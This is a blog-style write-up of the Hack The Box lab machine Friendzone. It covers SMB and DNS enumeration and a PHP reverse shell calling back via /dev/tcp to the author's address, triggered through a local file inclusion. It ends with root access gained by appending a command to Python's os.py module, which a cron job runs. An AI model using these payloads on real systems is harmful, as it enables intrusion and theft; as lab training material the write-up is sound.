---
layout: post
title:      "Hack The Box - Friendzone"
date:       2019-07-12
author:     "D4mianwayne"
tag:      nmap, ctf, HacktheBox, htb
category: Hack The Box
---

Today, we are going to pwn Friendzone from Hack The Box.

# Methodology

* Nmap scan of the machine 
* Checking SMB service and HTTP
* Using `dig` to get subdomians
* Uploading PHP reverse shell 
* Callback the reverse shell by exploiting LFI(Local File Inclusion)
* Getting user flag and SSH credentials
* Using cronjob to get root flag

# Nmap

Starting off with the nmap, `nmap -sV -sC -A 10.10.10.123` shows so many open ports but we have to start somewhere.
It includes:-

* 21 - FTP
* 22 - SSH
* 53 - DNS
* 80 - HTTP
* 139 & 445 - SMB
* 443 - SSL/HTTP

![](/img/friendzone/nmap.png)

# SMB and HTTP Enumeration

Using smbmap reveals we have access to `general` for read only and `Development` for read/write access.
So, we connect to `SMB` by using `smbclient //10.10.10.123/general/ -u root`  reveals we see `creds.txt` so we get it on our machine.

Now, `Developement` seems empty so I headover to HTTP port, it was basic html page without only one useful information **subdomain**. We noticed it has a subdomian named `friendzone.red`.
Running `gobuster` reveals nothing useful, so I moved on to DNS recon.


# DNS Enumeration and Login

Using `dig axrf friendzone.red @10.10.10.123` reveals a `administartor1.friendzone.red` so heading over to that shows a login page, loggin with the previous obtained credentials `admin:WORKWORKHhallelujah@#` , tell us to redirect to `dashboard.php`.

![](/img/friendzone/dig.png)

![](/img/friendzone/admin.png)

![](/img/friendzone/creds.png)

# Exploiting LFI vulnerability and callback Reverse Shell

This page seems told us to access url `default is image_id=a.jpg&pagename=timestamp`, seems LFI isn't it?

From previous SMB enumeration we knew that `Development` directory has read/write access so using php reverse shell wecan get access to friendzone machine.

Using folllowing code as `phpinfo.php`:-

```

<?php
exec(“/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.156/1234 0>&1’”);
phpinfo();
?>

```

we uploaded it to `Development ` directory by

`curl --upload-file phpinfo.php -u 'root' smb://10.10.10.123/Development/`, we uploaded our shell.

![](/img/friendzone/rev.png)

#### Callback

From previously found LFI, we access the our phpinfo file by 
`https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=/etc/Development/phpinfo`

![](/img/friendzone/lfi.png)

Not `a.jpg` because it was default so no need to, so back to our listener we get a shell.

![](/img/friendzone/revs.png)

#### User Flag

Once your listener get connected to our uploaded reverse shell you can get user flag.

![](/img/friendzone/user.png)


# Getting SSH Credentials

Checking directory and file reveals a interseting file named `mysql_data.conf` has following credentials:-

***

>for development process this is the mysql creds for user friend

>db_user=friend

db_pass=Agpyu12!0.213$

>db_name=FZ

***

![](/img/friendzone/sshcreds.png)

# SSH Login and root flag

Well, we login to ssh using previous credentials.

![](/img/friendzone/ssh.png)


### Analyzing Running Processes

There was a ELF file named `pspy64`, executing it shows running jobs in which we can very interesting process whuch was a python file.

![](/img/friendzone/cronjob.png)

Head over `/opt/server_admin/reporter.py` shows a nothing more than bunch of commented out line of python code.

```

#!/usr/bin/python

import os

to_address = “admin1@friendzone.com”
from_address = “
admin2@friendzone.com”

print “[+] Trying to send email to %s”%to_address

#command = ‘’’ mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass “PAPAP”’’’

#os.system(command)

# I need to edit the script later
# Sam ~ python developer

```

We can see a line importing python os module, since we don't have modify permissions for reporter.py we head over `/usr/bin/python2.7`  we can edit os.py i.e python's `os` module which has a function which allows us to execute any command by passing them as parameter. 

For example:-

```

import os
os.sytem('whoami') #friend

```

So we add a single line of code at the very end of `os.py` 

```

system('cp /root/root.txt /tmp/root1.txt') # calling system functon and copying flag

```

Hence, waiting for few minutes gives `root1.txt`.

![](/img/friendzone/root.jpg)

**Done!!**

<img src="https://www.hackthebox.eu/badge/image/129534" alt="Hack The Box">
